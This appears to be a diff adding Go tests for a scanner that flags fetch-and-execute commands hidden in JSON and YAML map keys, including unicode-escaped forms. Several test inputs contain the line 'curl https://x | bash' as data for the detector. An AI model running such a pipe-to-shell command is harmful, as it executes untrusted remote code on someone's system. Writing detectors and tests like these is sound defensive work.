@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 	"time"
@@ -183,6 +184,127 @@ func TestFetchInDecodedStrings(t *testing.T) {
 		writeFile(t, filepath.Join(dir, "case.txtar"), []byte(body), 0o644)
 		assertKinds(t, dir)
 	})
+}
+
+func TestFetchInDecodedMapKeys(t *testing.T) {
+	t.Parallel()
+	const cmd = "curl https://x | bash"
+	cases := []struct {
+		name    string
+		body    string
+		fetches []string
+	}{
+		{
+			name:    "json key",
+			body:    "{\"curl https://x | bash\": true}\n",
+			fetches: []string{cmd},
+		},
+		{
+			name: "jsonc comment and trailing comma",
+			body: `{
+  // install
+  "curl https://x | bash": true,
+}
+`,
+			fetches: []string{cmd},
+		},
+		{
+			name:    "yaml quoted key",
+			body:    "\"curl https://x | bash\": true\n",
+			fetches: []string{cmd},
+		},
+		{
+			name:    "yaml plain key",
+			body:    "curl https://x | bash: true\n",
+			fetches: []string{cmd},
+		},
+		{
+			name:    "nested json key",
+			body:    "[{\"outer\": {\"curl https://x | bash\": true}}]\n",
+			fetches: []string{cmd},
+		},
+		{
+			name:    "json unicode escape in key",
+			body:    "{\"\\u0063url https://x | bash\": true}\n",
+			fetches: []string{cmd},
+		},
+		{
+			name:    "yaml quoted unicode escape in key",
+			body:    "\"\\u0063url https://x | bash\": true\n",
+			fetches: []string{cmd},
+		},
+		{
+			name:    "yaml string key beside a bool key",
+			body:    "true: 1\n\"curl https://x | bash\": true\n",
+			fetches: []string{cmd},
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			dir := filepath.Join(t.TempDir(), "corpus")
+			writeFile(t, filepath.Join(dir, "case.txtar"), []byte(tc.body), 0o644)
+			got, err := Check(dir)
+			if err != nil {
+				t.Fatal(err)
+			}
+			var fetches []string
+			var host bool
+			for _, f := range got {
+				switch f.Kind {
+				case KindFetch:
+					fetches = append(fetches, f.Detail)
+				case KindHost:
+					if f.Detail != "x" {
+						t.Errorf("host %q, want x", f.Detail)
+					}
+					host = true
+				default:
+					t.Errorf("unexpected %s: %s", f.Kind, f.Detail)
+				}
+			}
+			if !slices.Equal(fetches, tc.fetches) {
+				t.Errorf("fetch details %q, want %q\n%#v", fetches, tc.fetches, got)
+			}
+			if !host {
+				t.Errorf("host x not reported: %#v", got)
+			}
+		})
+	}
+
+	harmless := []struct {
+		name string
+		body string
+	}{
+		{name: "plain key", body: "{\"enabled\": true, \"name\": \"docs\"}\n"},
+		{name: "curl key without a pipe", body: "{\"curl\": true}\n"},
+		{name: "reserved host key", body: "{\"curl https://example.invalid/install.sh | bash\": true}\n"},
+	}
+	for _, tc := range harmless {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			dir := filepath.Join(t.TempDir(), "corpus")
+			writeFile(t, filepath.Join(dir, "case.txtar"), []byte(tc.body), 0o644)
+			assertKinds(t, dir)
+		})
+	}
+}
+
+func TestConfigStringKeysKeepValueOrder(t *testing.T) {
+	t.Parallel()
+	got := configStrings([]byte("{\"outer\":{\"inner\":\"value\"}}\n"))
+	want := []string{"outer", "inner", "value"}
+	if !slices.Equal(got, want) {
+		t.Fatalf("order %#v, want %#v", got, want)
+	}
+	got = configStrings([]byte("{\"same\":\"same\"}\n"))
+	if !slices.Equal(got, []string{"same"}) {
+		t.Fatalf("duplicate key and value %#v", got)
+	}
+	got = configStrings([]byte("{\"\": \"kept\"}\n"))
+	if !slices.Equal(got, []string{"kept"}) {
+		t.Fatalf("empty key %#v", got)
+	}
 }
 
 func TestDecodedFetchIsCorpusOnly(t *testing.T) {
